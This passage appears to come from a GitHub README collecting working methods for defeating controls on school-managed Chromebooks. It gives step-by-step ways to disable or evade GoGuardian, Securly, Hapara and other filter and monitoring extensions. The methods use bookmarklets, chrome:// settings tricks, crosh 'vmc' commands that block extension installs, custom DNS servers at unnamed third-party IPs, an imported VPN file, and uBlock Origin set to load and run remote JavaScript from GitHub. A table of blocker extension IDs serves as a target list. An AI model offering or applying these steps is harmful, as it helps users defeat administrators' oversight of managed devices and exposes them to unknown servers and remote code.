6. All extensions should stop working.
7. Note that you have to repeat this every time you restart or sign out.
8. If the link gets patched and you no longer see the blue button, go to `chrome://settings/resetProfileSettings` click current settings, it'll open a blank page, on that page run 
```js
javascript:opener.chrome.send("TurnOffSync");
```
And visit `chrome://restart`.

Workaround for `chrome://settings/signOut` and `javascript:opener.chrome.send("TurnOffSync");` if both patched: Just go to `chrome://settings/syncSetup/advanced` and click 
Customize sync and then flip off the Extensions and Apps or just flip off everything exept for bookmarks

**This was discovered by zoroark and Brandon421-ops**

</details>

<details>
<summary><b>Extention Inactivity hack</b> Inactive Extensions</summary>

1. First do the Esc+Refresh+Power

2. ctrl+d then enter

3. will give you some bullcrap about dev mode is blocked press enter then you will go to a newly restarted chromebook

4. next add wifi-

5. then sign into your account

6. Immediately turn wifi off before extensions load

7. go to `chrome://settings/signOut`

8. click turn off sync and personalization and then turn wifi back on go to whatever site that is extension blocked.

1. Workaround for chrome://settings/signOut if patched: If the link gets patched and you no longer see the blue button, go to `chrome://settings/resetProfileSettings` click current settings, it'll open a blank page, on that page run 
```js
javascript:opener.chrome.send("TurnOffSync");
```
2. Workaround for `chrome://settings/signOut` and `javascript:opener.chrome.send("TurnOffSync");` if both patched: Just go to `chrome://settings/syncSetup/advanced` and click 
Customize sync and then flip off the Extensions and Apps or just flip off everything exept for bookmarks

Note: Before you do any of this do it at home so that way you don have to worry about asking for the school wifi password.

</details>

<details>
<summary><b>New Temporarily Unblock Anything</b> Temporarily Unblock Any Website</summary>

**Might Be Patched on 115 And Above**
  
1. Go to the chrome-extension://Paste the blocker id here/manifest.json page.

2. Go to a new tab page and type in the URL Website you want to unblock don´t go into that website yet just leave it inside the URL Box.

3. Go back to chrome-extension://Paste the blocker id here/manifest.json now create a bookmark called E now click more and In the URL Box you put `chrome://kill` now save that bookmark.

4. Create another bookmark called D click more In the URL Box copy and paste  `javascript:(function () {window.onbeforeunload = function() { return 1; };})()`    Into that URL Box and save that bookmark.

5. Go back to chrome-extension://Paste the blocker id here/manifest.json page and now click bookmark B then quickly go back to the new tab page and click enter now quickly spam bookmark D like 2 or more times now there should be a pop up called do you want to close this page click cancel now boom that website is unblocked until you turn off your chromebook or until you exit out of that website then if that happen´s your gonna have to do all the steps again.

  Easier way for step 2: instead of putting the URL in the new tab box go to chrome-extension://Paste the blocker id here/manifest.json page then click Bookmark E then go to a random website then use the javascript:open('https://YOUR WEBSITE HERE?'+'i'.repeat(1)) Bookmarklet then spam Bookmark D two or more times then a pop up should appear quickly click cancel now boom all done.    Name of Bookmarklet > Unblock Website: javascript:open('https://YOUR WEBSITE HERE?'+'i'.repeat(1))

Note: Save chrome-extension://Paste the blocker id here/manifest.json as a bookmark so you don´t have to come back here and type in the URL thing.

IMPORTANT NOTE: if bookmarklets are blocked your screwed

This workaround was found by <a href="https://github.com/Brandon421-ops">Brandon421-ops</a>

</details>

<details>
<summary><b>Old Temporarily Unblock Anything</b> Temporarily Unblock Any Website</summary>

1. Make a bookmark called tab close blocker now click more on the bottom left corner now in that URL BOX put  `javascript:(function () {window.onbeforeunload = function() { return 1; };})()`

2. Go to a newtab page now go into the URL BOX on the top and put https://YOUR WEBSITE HERE do not click enter yet stay in that URL BOX.

3. Do `search`+`esc` now that should open task manager if `search`+`esc` doesn't work then click the three dots on the top right now scroll down until you find more tools click that and now find task manager click it now boom done with step 3.

4. Find your blocker extension and click it now on the bottom right you should see a button called End process click it now quickly click the URL BOX on the newtab page and click enter now quickly spam the bookmark tab close blocker now a pop up should come up it should have to buttons cancel and leave click cancel and boom done.

  IMPORTANT NOTE: if bookmarklets are blocked your screwed also if task manager or the End process button for task manager is blocked your double screwed.

  </details>

<details>
<summary><b>uBlock Origin</b> Run Code On Pages</summary>

if your school allows the ublock origin chrome extension, then running the edpuzzle script (as well as any other bookmarklet) is possible

1. install ublock origin (<a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm">https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm</a>)

2. go to the extension's settings

3. under the settings tab, check the "i am an advanced user" box and click on the cog icon

4. inside the advanced settings (`chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/advanced-settings.html`), scroll down and find `userResourcesLocation` now change `userResourcesLocation` from `unset` to <a href="https://raw.githubusercontent.com/Brandon421-ops/Exploits-And-Hacks/main/ublockExec.js">https://raw.githubusercontent.com/Brandon421-ops/Exploits-And-Hacks/main/ublockExec.js</a>

5. in the My filters tab of the settings (`chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/dashboard.html#1p-filters.html`), add `*##+js(execute_script.js)` as a filter

6. now you can press `ctrl`+`alt`+`~` to run any js on the current page

7. if you want to run a bookmarklet, just paste in the javascript: url and press ok on the popup

</details>

<details>
<summary><b>Incognito</b> Bypass Extensions</summary>
IP Servers: Server 1. 52.207.185.90
            Server 2. 158.111.114.159

Step 1. Go to your settings

Step 2. Click on the wifi your using rn then click it again.

Step 3.  Scroll down until you see network once you see the option click it.

Step 4. Scroll down until you find custom name servers now once you find the option click it.

Step 5. Paste in the IP Server.

Step 6. Now there should be a notification saying open new tab click that and now you should be in a small window some instructions and there are 2 buttons click the yellow with black letters button and boom Incognito Mode is Unblocked.
One of the buttons are just a link in blue don´t click that one is just for test´s
Step 7. Go back to the network settings and change back the custom name servers to automatic name servers.
Note: If your connection is slow if your school has more than one wifi then connect to the other wifi that might have a better connection.

Btw if you close out of the Incognito Tab your gonna have to do all the steps again.

Cool Advanced Facts About Incognito Mode:
1. Bypass Extensions Aka Unblock All Websites.
2. Your History Is Hidden From Your School

</details>

<details>
<summary><b>Incognito On The Sign-In Screen</b> Bypass Extensions/Unblocked Google Webview</summary>
Might work but idk if it will

IP Servers: Server 1. 52.207.185.90
            Server 2. 158.111.114.159

Step 1. On the sign-in screen go to your wifi settings and click on the wifi your using rn

Step 2. Then Scroll down until you see network once you see the option click it.

Step 3. Scroll down until you find custom name servers now once you find the option click it.

Step 4. Paste in the IP Server.

Step 5. Now on the network settings click the sign in and now you should be in a small window some instructions and there are 2 buttons click the blue link and boom unblocked webview of google.

Cool Advanced Facts About Incognito Mode:
1. Bypass Extensions Aka Unblock All Websites.
2. Your History Is Hidden From Your School

</details>

<details>
<summary><b>Chrome-Signin Webview</b> Bypass Extensions</summary>
Unblocked Google
  
Step 1. Go to `chrome://chrome-signin`

Step 2. Click ok on the bottom right corner

Step 3. In the Email text box put `google@d11.org`

Step 4. Click `signin options`

Step 5. Now click signin with github

Step 6. Click the github logo

Step 7. In the search box on the top Right type google and then click see more topics then you will see all the google links click `www.google.com` now boom unblocked Google.

</details>

<details>
<summary><b>Chrome-Signin Webview 2</b> Bypass Extensions</summary>
Unblocked Google
  
Step 1. Go to `chrome://chrome-signin`

Step 2. Click ok on the bottom right corner

Step 3. In the Email text box put `google@d11.org`

Step 4. Click `signin options`

Step 5. Now click signin with github

Step 6 Click forgot password instead of github logo

Step 7. Click docs

Step 8. Scroll down

Step 9. Click ask the GitHub community

Step 10. Search google and click the hyperlink on the right

Credit to snail for finding this workaround.

</details>

<details>
<summary><b>Microsoft Labs</b> Bypass Extensions</summary>

YOU NEED A MICROSOFT ACCOUNT FOR THIS

Go to: <a href="https://learn.microsoft.com/en-us/training/modules/implement-common-integration-features-finance-ops/10-exercise-1">https://learn.microsoft.com/en-us/training/modules/implement-common-integration-features-finance-ops/10-exercise-1</a>

Next, sign into your Microsoft account, then if it doesn't already, go back to that link

Then, hit Launch VM Mode See images attached if needed

After it loads it's gonna ask for a password, the password is pass@word1 See images attached if needed

Then boom, you are done.

It's still kinda limited, like you can't go on Spotify sound doesn't output anyway and it, blocks random sites, but discord 100% works

Thanks to a user in TN, I was informed the best vpn to get around the FortiNet thing "Greenhub" on the Edge add-ons 

</details>

<details>
<summary><b>Quick View</b> Bypass Extensions</summary>

**QuickView is a universal webview exploit in Chrome OS that utilizes the QuickOffice component extension. This exploit lets you create login windows with arbitrary URLs, thus allowing you to load pages without any extensions.**

Go to <a href="https://quickview-exploit.pages.dev/">this link</a> and follow instructions

WARNING: If `javascript://` is blocked then you can't preform this exploit

Credit to <a href="https://ading.dev/">ading2210</a> and <a href="https://buymeacoffee.com/bypassi">Bypassi#7037</a> for finding this exploit

</details>

<details>
<summary><b>Buypass</b> Temporarily Unblock Websites</summary>

Exploit Made By <a href="https://buymeacoffee.com/bypassi">Bypassi#7037</a>

Here's the original github repo of the buypass exploit: <a href="https://github.com/bypassiwastaken/buypass">Bypassi#7037's Buypass Exploit Github Repo</a>

Here's the original website of the buypass exploit: <a href="https://buypass.bypassi.com/">Bypassi#7037's Buypass Exploit Website</a>

Here's the forked github repo of the buypass exploit: <a href="https://github.com/Brandon421-ops/buypass">Brandon421-ops's Forked Buypass Exploit Github Repo</a>

Here's 3 alternative websites of the buypass exploit:

1. <a href="https://buypass.brandonprather.repl.co/">Buypass Exploit Repl Website</a>

2. <a href="https://buypass.glitch.me/">Buypass Exploit Glitch Website</a>

3. <a href="https://buypass.netlify.app/">Buypass Exploit netlify.app Website</a>

This Exploit Is Kinda Similar To The Quick View Exploit

</details>

<details>
<summary><b>[Webview] Testnav Exploit</b> Unblocked Webview for either google or a web browser</summary>

Step 1. Download Testnav off the webstore/playstore/or run as a kiosk app as some schools have it added as one

Step 2. Open it

Step 3. After opened it will probably bring you to the page were you select your consumer, click aimsweb/aimsweb plus

Step 4. After you click goto select your district in the bottom right corner of the page

Step 5. Select “STRATFORD FRIENDS SCHOOL” 

Step 6. Click the arrow to the right of the selection box

Step 7. Click sign in options
a) Click sign in with github

Step  8. Click the github logo at the top of the screen

Step 9. Click the three bars in the top right corner, then goto the search box and type in googleyay

Step 11. Scroll down until you see DerDer56/googleyay

Step 12. There's several links to choose from, but if there's a link you want that's not there click the Bypassi Redirect Tool

(Optional) Step 13. Type in the link you want to go on and click "Go To the URL"

Step 14. Click it and you have webview (unblocked browser)

</details>

<details>
<summary><b>OP Crosh</b> Disable extensions with crosh and vmc</summary>

### Requirements
- A managed Chromebook with crosh enabled
- The `VmManagementCliAllowed` policy either unset or set to true
- Some form of removable media for noting down extension IDs (only useful for the second method and not required, but this prevents you from mistyping an extension ID).
- A willingness to powerwash

### There are two variations to this method:
1. Disabling all extensions. This is probably the most reliable, but you'd be left without useful extensions such as any adblockers. You also aren't able to install anything from the Chrome Web Store either.

2. Disabling specific extensions. This is less reliable, since this only becomes possible once Chrome OS has installed at least one extension already, which could be one that you're trying to disable.

### Testing if the method is possible:
1. Open crosh by hitting `ctrl`+`alt`+`t`
. If a command line pops up then you have crosh enabled and you can move on to step 2.

2. Test the `VmManagementCliAllowed` policy by running the `vmc` command. If a list of subcommands is shown, then you're good to go.

### Instructions:
1. Back up any data you want before the powerwash.

2. If you're doing the second variation, note down any extension IDs. You may also want to do this if you intend on disabling all extensions, since sometimes that will fail and require you to specify each extension you want to disable.

3. Powerwash by attempting to enable developer mode. Instructions are available <a href="https://chromium.googlesource.com/chromiumos/docs/+/master/developer_mode.md#dev-mode">here</a>.

4. Log into your Google account as normal, but immediately disable your internet right after you sign in.

5. You should be logged into your account, but without any extensions installed due to being offline.

6. Here the instructions are split, so follow the one for the method that you want to do.
 
### Disable All Extensions:
1. Open up crosh by hitting `ctrl`+`alt`+`t`

2. Type in `vmc create-extra-disk --size 1 /home/chronos/user/Extensions`

3. Run that command.

4. If it fails with a "file exists" error, then you must individually specify each extension that you want to remove. Move to step 5 of the next section to do that.

5. Re-enable your internet, and no extensions should be installed.
 

### Disable Specific Extensions:
1. Navigate to `chrome://extensions`.

2. Enable your internet, and immediately disable it when an extension is installed.

3. Assuming the installed extension was not one that you were trying to disable, move on to step 4. If it was, you'd have to powerwash to try again.

4. Open up crosh by hitting `ctrl`+`alt`+`t`.

5. For each extension you want to disable, run this command: `vmc create-extra-disk --size 1 /home/chronos/user/Extensions/{extension_id}`

6. Each command should look something like this: `vmc create-extra-disk --size 1 /home/chronos/user/Extensions/cjpalhdlnbpafiamejdnhcphjbkeiagm`

7. Re-enable your internet, and if you typed/pasted in the extension IDs correctly, those specific extensions should be blocked from ever being installed.

Credit to <a href="https://ading.dev/">ading2210</a> for finding this exploit

</details>

<details>
<summary><b>GoGuardian Fever</b> Disable GoGuardian</summary>

IF YOU DO NOT HAVE GOGUARDIAN THIS EXPLOIT WILL NOT WORK FOR YOU
Getting Started

1. Obviously (but still needs to be said due to skids in Titanium Network), make sure GoGuardian is actually installed

2. Visit any of the links and copy the text in it and paste it in a newtab <a href="https://github.com/Brandon421-ops/Exploits-And-Hacks/blob/main/GoGuardian%20Fever.txt">Link 1</a> <a href="https://raw.githubusercontent.com/Brandon421-ops/Exploits-And-Hacks/main/GoGuardian%20Fever.txt">Link 2</a> <a href="https://pastebin.com/raw/ytcMuigM">Link 3</a>

3. On that tab there will be a simple white screen with nothing on it, reload the page

4. If the GET request fails and you are left on an error screen (don't panic, this is intended, continue)

5. Visit `chrome://restart` to clear cached sites from GoGuardian

Enjoy a free browsing context

To undo

1. On <a href="https://goguardian.com">goguardian.com</a>, press the lock icon at the top left of the screen

2. Press cookies and site data

3. Click manage cookies

4. Then click clear each site's cookies you see there

</details>

<details>
<summary><b>Disable GoGuardian With The Chat</b> Disable GoGuardian [Unreliable]</summary>

1. wait until your teacher opens the chat window thingy

2. spam the x button until it stops re-opening

3. open the url `chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/manifest.json`

4. open `chrome://extensions/?id=haldlgldplgnggkjaafhelgiaglafanh`, and toggle the “allow access to file:// urls” switch

goguardian is now disabled and you can close both tabs 

made by carteeeee

</details>

<details>
<summary><b>GoGuardian TabCrash</b> Disables GoGuardian Actions w/TAB LIMIT</summary>

**Teacher's can still see your screen, but they can't block or close any of your tabs.**

**YOUR TEACHER NEEDS TO HAVE SET A TAB LIMIT. TRY OPENING TONS OF TABS TO CONVINCE THEM TO ENABLE TAB LIMITS**.

1. create a bookmark named anything: `javascript: window.onbeforeunload = ()=>{return false;}`

2. Hold down CTRL and then SPAM CLICK the bookmark until you're well above the tab limit, opening a bunch of `about:blank` pages.

3. It might ask if you want to leave this page, this is goguardian trying to close it. Say No, and click `Prevent from creating additional dialogues`.

4. Enjoy your unblocked stay!

To undo: close all of your `about:blank` tabs

#### Discovered by @py660

</details>

<details>
<summary><b>GoGuardian TabCrash 2</b> Disables GoGuardian Actions w/TAB LIMIT</summary>

**If your teacher has turned on the tab limit you can bypass this with an extension. If the extension is blocked, sorry.**

Step 1. Download the extension <a href="https://chromewebstore.google.com/detail/read-aloud-a-text-to-spee/hdhinadidafjejdhmfkjgnolgimiaplp">Read Aloud: A Text to Speech Voice Reader</a>

Step 2. Use one of your tabs to go to IReady or Scratch. You just need a site that would display the error when you close the tab "Are you sure you want to close this site? Unsaved changes could be lost." 

Step 3. When you have the site with unsaved changes, click the extension until you see the error. Click cancel on the error.

Step 4. The extension should have opened some tabs which say: "Read Aloud uses this tab for audio playback."

Step 5. If you saw the error and clicked cancel, you should have bypassed the tab limit.

</details>

<details>
<summary><b>Insecurly</b> Toggle the Securly extension</summary>

**ONLY FOR SECURLY USERS**

Go to <a href="https://www.disablesecurly.com/">this link</a> and follow instructions

If blocked then go cry in a corner

Credit to <a href="https://www.buymeacoffee.com/bypassi">Bypassi#7037</a> for finding/Making this exploit

</details>

<details>
<summary><b>A Bypass For Securly and a few of other blocker extensions</b> Manipulate any website so securly or any other blocker extension can't block it</summary>

At any URL put #translate.google.com at the end of it or put ?suicidepreventionlifeline.org at the end of it and bam you just unblocked a website by Manipulating the URL

This only works for securly and some other blocker extensions

</details>

<details>
<summary><b>Glitch through securly</b> Unblock any website blocked from securly</summary>

**This only works if your admin/school uses securly. Not sure if this can be blocked or not. So im going to do this step by step**

1. Go to the blocked site you want to access

2. Once it shows the blocked page copy the url it shows

3. Go to the url bar and delete everything between https:// and the first "?"

4. Paste the website url

5. press enter and voila it should be unblocked

6. Have fun

confirmed working with xbox cloud gaming and now.gg

If it doesn't work then go cry.

</details>

<details>  
<summary><b>SOT Exploit</b> Unblock any website or Open any website in a about:blank page</summary>

1. Download this extension <a href="https://chromewebstore.google.com/detail/onetab/chphlpgkkbolifaimnlloiipkdnihall">One Tab</a>

2. Click the import button in the settings tab.

3. Copy-paste the URL you wish to visit about 100 times, and then click import.

4. Spam click the top link, then either spam escape on one of them or wait for one to load on a about:blank page.
  
Credit to <a href="https://github.com/Coding4Hours">Coding4Hours</a>

</details>

<details>
<summary><b>Chaos</b> A full bypass method for Hapara Highlights and Hapara Filter</summary>

**Devtools must not be blocked by policy to perform this exploit.**

Go to <a href="https://xlak.github.io/chaos/">this link</a> and follow instructions

If blocked then go cry in a corner

</details>

<details>  
<summary><b>Filter session bypass</b> Bypass hapara filter session</summary>

Bookmark this link: <a href="filtersessionbypass.txt">filtersessionbypass.txt</a>

During a filter session, right click the link, and press "Open in a new tab"
Then insert the URL for any website you want to go to.  Make sure to include https://<br>
If it says "website name refused to connect", try using a web proxy.<br>
Also this dosn't bypass blocker extentions so use an unblocked link, or another exploit.

</details>

<details>  
<summary><b>Hapara Lock Screen Bypass</b> Bypass Hapara Lock Screen</summary>

1. Make bookmarks of pages you want to visit beforehand.

2. Once your screen is paused, spam unfullscreen. Each time you do, you should see your tabs and bookmark bar come back. Attempt to right-click on the bookmarks bar until a menu shows up.

3. In the menu, select “Add folder”. Name it whatever you like. Hit Done. With luck, your tabs and bookmarks should stay at the top of your screen. If not, try again.

4. Once the tab and bookmarks bar stays, spam-click one of the bookmarks you made. This lags Hapara into displaying your page instead of the pause page. Turn off your wifi as soon as the page fully loads. This stops data flow between your amd the teacher’s computer, so that they can’t re-pause your screen.

</details>

<details>
<summary><b>Network Bypassing Via DNS</b> A bypass for any network filters</summary>

**A network filter is something that blocks website on the actual network instead of the operating system. Thus you can't disable with exploits like LTBEEF or LTMEAT.**

IP Server 1: 8.8.8.8 in all boxes

IP Server 2: 1.1.1.1 in the first box and 1.0.0.1 in the second box the third and fourth box stay 0.0.0.0

Step 1. Go to your settings

Step 2. Click on the wifi your using rn then click it again.

Step 3.  Scroll down until you see network once you see the option click it.

Step 4. Scroll down until you find custom name servers now once you find the option click it.

Step 5. Paste in one of the IP Server's.

Note: If IP Server 1 doesn't work then use IP Server 2 if IP Server 2 doesn't work then try using IP Server 1 if they both don't work your screwed

</details>

<details>  
<summary><b>Network Bypassing Via VPN</b> A bypass for any network filters</summary>

**A network filter is something that blocks website on the actual network instead of the operating system. Thus you can't disable with exploits like LTBEEF or LTMEAT.**

Go to <a href="https://drive.google.com/file/d/1MGVFf8d9pww0M2bO9ogxQX1LyR1y6zc_/view">this link</a> once you have downloaded the ONC file. Goto chrome://network and press "Import ONC File". You will have know if it worked if it says: "Network imported: 1". Then click on the time, or goto settings. Find VPN, click on it and click on the "Haven VPN" it will say "Connected" and now you are free.


If chrome://network is blocked, start bawling your eyes out and beat up your IT manager. 

</details>

<details>  
<summary><b>Extension ID's</b> </summary>

|Extension Name|Extension ID|
|--------------|------------|
|GoGuardian|`haldlgldplgnggkjaafhelgiaglafanh`|
|Mobile Guardian (installed)|`fgmafhdohjkdhfaacgbgclmfgkgokgmb`|
|<a href="https://chrome.google.com/webstore/detail/mobile-guardian/nglbmaiijljohnphofifiodoommladkj">Mobile Guardian (setup)</a>|`nglbmaiijljohnphofifiodoommladkj`|
|<a href="https://chrome.google.com/webstore/detail/securly-for-chromebooks/iheobagjkfklnlikgihanlhcddjoihkg">Securly (webstore)</a>|`iheobagjkfklnlikgihanlhcddjoihkg`|
|Securly|`joflmkccibkooplaeoinecjbmdebglab`|
|Securly (old)|`iheobagjkfklnlikgihanlhcddjoihkg`|
|Securly Classroom|`jfbecfmiegcjddenjhlbhlikcbfmnafd`|
|<a href="https://chrome.google.com/webstore/detail/blocksi-enterprise-editio/ghlpmldmjjhmdgmneoaibbegkjjbonbk">Blocksi</a>|`pgmjaihnmedpcdkjcgigocogcbffgkbn`|
|<a href="https://chrome.google.com/webstore/detail/iboss-cloud-enterprise/kmffehbidlalibfeklaefnckpidbodff">iBoss</a>|`kmffehbidlalibfeklaefnckpidbodff`|
|<a href="https://chrome.google.com/webstore/detail/forticlient-chromebook-we/igbgpehnbmhgdgjbhkkpedommgmfbeao">Fortiguard</a>|`igbgpehnbmhgdgjbhkkpedommgmfbeao`|
|<a href="https://chrome.google.com/webstore/detail/cisco-umbrella-chromebook/jcdhmojfecjfmbdpchihbeilohgnbdci">Cisco Umbrella</a>|`jcdhmojfecjfmbdpchihbeilohgnbdci`|
|NetRef|`khfdeghnhlpdfeenmdofgcbilkngngcp`|
|<a href="https://chrome.google.com/webstore/detail/ckauthenticator/jdogphakondfdmcanpapfahkdomaicfa">ContentKeeper</a>|`jdogphakondfdmcanpapfahkdomaicfa`|
|CK-Authenticator G3|`odoanpnonilogofggaohhkdkdgbhdljp`|
|<a href="https://chrome.google.com/webstore/detail/hapara-highlights-extensi/kbohafcopfpigkjdimdcdgenlhkmhbnc">Hapara</a>|`kbohafcopfpigkjdimdcdgenlhkmhbnc`|
|Smoothwall|`jbldkhfglmgeihlcaeliadhipokhocnm`|
|Linewize|`ddfbkhpmcdbciejenfcolaaiebnjcbfc`|
|<a href="https://chrome.google.com/webstore/detail/lanschool-air-chrome-exte/baleiojnjpgeojohhhfbichcodgljmnj">LANSchool</a>|`baleiojnjpgeojohhhfbichcodgljmnj`|
|<a href="https://chrome.google.com/webstore/detail/lanschool-web-helper/honjcnefekfnompampcpmcdadibmjhlk">LanSchool Web Helper</a>|`honjcnefekfnompampcpmcdadibmjhlk`|
|Lightspeed Filter Agent|`adkcpkpghahmbopkjchobieckeoaoeem`|
|Lightspeed Device Insider Agent|`njdniclgegijdcdliklgieicanpmcngj`|
|<a href="https://chrome.google.com/webstore/detail/interclass-filtering-serv/jbddgjglgkkneonnineaohdhabjbgopi">InterCLASS Filtering Service</a>|`jbddgjglgkkneonnineaohdhabjbgopi`|
|<a href="https://chrome.google.com/webstore/detail/imtlazarusv16/cgigopjakkeclhggchgnhmpmhghcbnaf">IMTLazarus</a>|`cgigopjakkeclhggchgnhmpmhghcbnaf`| 
|<a href="https://chrome.google.com/webstore/detail/impero-backdrop/jjpmjccpemllnmgiaojaocgnakpmfgjg">Impero Backdrop</a>|`jjpmjccpemllnmgiaojaocgnakpmfgjg`|
|<a href="https://chrome.google.com/webstore/detail/intersafe-gatewayconnecti/ecjoghccnjlodjlmkgmnbnkdcbnjgden">InterSafe GatewayConnection Agent</a>|`ecjoghccnjlodjlmkgmnbnkdcbnjgden`| 
|<a href="https://chrome.google.com/webstore/detail/gopher-buddy/cgbbbjmgdpnifijconhamggjehlamcif">Gopher Buddy</a>|`cgbbbjmgdpnifijconhamggjehlamcif`|
|<a href="https://chrome.google.com/webstore/detail/connect-for-chrome-educat/ddfbkhpmcdbciejenfcolaaiebnjcbfc">Connect for Chrome - Education</a>|`ddfbkhpmcdbciejenfcolaaiebnjcbfc`|

If your blocker is not on this list: go to `chrome://extensions`, details on your blockers extension, then copy the code in the url (after chrome://extensions/?id=). 
Here's all the good places to find your Blocker id 
`chrome://extensions` 
`chrome://extensions-internals` 
`chrome://process-internals` 
Search up the blocker ID on google if you have too 
If you can't find them in those URL'S Manualy then try to do ctrl + f and type in your blocker name or ID

</details>
